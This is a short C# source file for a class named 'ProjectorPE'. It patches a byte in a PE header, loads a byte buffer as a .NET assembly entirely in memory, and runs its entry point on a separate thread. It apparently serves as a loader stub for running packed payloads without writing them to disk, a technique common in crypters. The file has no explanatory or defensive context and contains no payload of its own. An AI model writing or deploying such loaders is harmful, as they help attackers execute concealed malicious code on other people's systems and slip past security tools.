using System;
using System.Reflection;
using System.Security;
using System.Threading;

public static class ProjectorPE
{
	[SuppressUnmanagedCodeSecurity]
	private delegate object ExecuteAssembly(object sender, object[] parameters);

	public static void Run(byte[] buffer)
	{
		int num = BitConverter.ToInt32(buffer, 60);
		Buffer.SetByte(buffer, num + 920, 2);
		object[] parameters = null;
		Assembly assembly = Thread.GetDomain().Load(buffer);
		MethodInfo entrypoint = assembly.EntryPoint;
		if (entrypoint.GetParameters().Length != 0)
		{
			parameters = new object[1] { new string[1] };
		}
		Thread thread = new Thread((ThreadStart)delegate
		{
			Thread.BeginThreadAffinity();
			Thread.BeginCriticalRegion();
			ExecuteAssembly executeAssembly = entrypoint.Invoke;
			executeAssembly(null, parameters);
			Thread.EndCriticalRegion();
			Thread.EndThreadAffinity();
		});
		if (parameters != null)
		{
			if (parameters.Length != 0)
			{
				thread.SetApartmentState(ApartmentState.STA);
			}
			else
			{
				thread.SetApartmentState(ApartmentState.MTA);
			}
		}
		thread.Start();
	}

	public static void Run(string strBuffer)
	{
		byte[] buffer = Unwrap(strBuffer);
		Run(buffer);
	}

	private static byte[] Unwrap(string buffer)
	{
		byte[] array = new byte[buffer.Length];
		for (int i = 0; i < buffer.Length; i++)
		{
			array[i] = (byte)buffer[i];
		}
		return array;
	}
}
